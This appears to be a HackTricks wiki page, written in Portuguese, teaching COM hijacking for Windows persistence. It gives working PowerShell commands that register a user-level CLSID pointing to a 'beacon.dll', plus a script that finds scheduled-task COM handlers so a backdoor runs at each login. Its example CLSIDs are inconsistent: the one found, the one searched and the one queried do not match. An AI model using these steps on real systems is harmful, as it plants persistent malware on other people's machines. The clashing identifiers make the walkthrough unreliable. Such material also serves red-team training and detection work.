# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Buscando componentes COM inexistentes

Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking** pode ser usado como um **mecanismo persistente**. Usando `procmon`, é fácil encontrar registros COM pesquisados que não existem e que um atacante poderia criar para persistir. Filtros:

- Operações **RegOpenKey**.
- onde o _Resultado_ é **NOME NÃO ENCONTRADO**.
- e o _Caminho_ termina com **InprocServer32**.

Uma vez que você tenha decidido qual COM inexistente impersonar, execute os seguintes comandos. _Tenha cuidado se decidir impersonar um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componentes COM do Agendador de Tarefas que podem ser sequestrados

As Tarefas do Windows usam Gatilhos Personalizados para chamar objetos COM e, como são executadas através do Agendador de Tarefas, é mais fácil prever quando serão acionadas.

<pre class="language-powershell"><code class="lang-powershell"># Mostrar CLSIDs COM
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Nome da Tarefa: " $Task.TaskName
Write-Host "Caminho da Tarefa: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Saída de Exemplo:
<strong># Nome da Tarefa:  Exemplo
</strong># Caminho da Tarefa:  \Microsoft\Windows\Exemplo\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [mais como o anterior...]</code></pre>

Verificando a saída, você pode selecionar uma que será executada **toda vez que um usuário fizer login**, por exemplo.

Agora, ao procurar pelo CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e em HKLM e HKCU, você geralmente encontrará que o valor não existe em HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Então, você pode apenas criar a entrada HKCU e toda vez que o usuário fizer login, seu backdoor será ativado.

{{#include ../../banners/hacktricks-training.md}}
